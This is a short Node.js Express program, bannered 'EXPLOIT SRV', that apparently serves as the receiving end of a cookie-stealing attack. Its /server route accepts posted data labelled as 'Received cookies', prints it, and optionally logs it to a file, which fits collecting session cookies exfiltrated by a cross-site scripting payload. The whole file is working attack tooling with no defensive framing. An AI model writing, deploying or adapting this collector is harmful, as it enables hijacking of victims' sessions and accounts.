const express = require('express');
const cors = require('cors');
const colors = require('colors');
const fs = require('fs');
const readline = require('readline')

// Function to display a colored banner
function displayBanner() {
  const banner = `



███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗    ███████╗██████╗ ██╗   ██╗
██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝    ██╔════╝██╔══██╗██║   ██║
█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║       ███████╗██████╔╝██║   ██║
██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║       ╚════██║██╔══██╗╚██╗ ██╔╝
███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║       ███████║██║  ██║ ╚████╔╝ 
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝       ╚══════╝╚═╝  ╚═╝  ╚═══╝  
                                                          by Oziesiek	`;

  console.log(colors.red(banner));
}

// Display the banner at the beginning
displayBanner();

const app = express();

app.use(cors({
  origin: 'http://0.0.0.0:8000',
  credentials: true
}));

app.use(express.json());

app.post('/server', (req, res) => { // Change the route to /server
  console.log(colors.yellow('[+] Received cookies:'), req.body);
  logToFile('[+] Received cookies: ' + JSON.stringify(req.body)); // Log to file
  // Process the received cookies here
  res.send('Cookies received successfully');
});

const port = 3000;
app.listen(port, () => {
  console.log(colors.green(`Server is running, listening on ${port}`));
  promptForLogging(); // Prompt for logging preferences when server starts
});

function promptForLogging() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question('Do you want to log to a file? (yes/no): ', (answer) => {
    if (answer.toLowerCase() === 'yes') {
      rl.question('Enter the file name: ', (fileName) => {
        // Store the file name for logging
        global.logFileName = fileName;
        console.log(`Logging to file ${fileName}`);
        rl.close();
      });
    } else {
      rl.close();
    }
  });
}

function logToFile(message) {
  if (global.logFileName) {
    fs.appendFile(global.logFileName, message + '\n', (err) => {
      if (err) {
        console.error('Error logging to file:', err);
      }
    });
  }
}
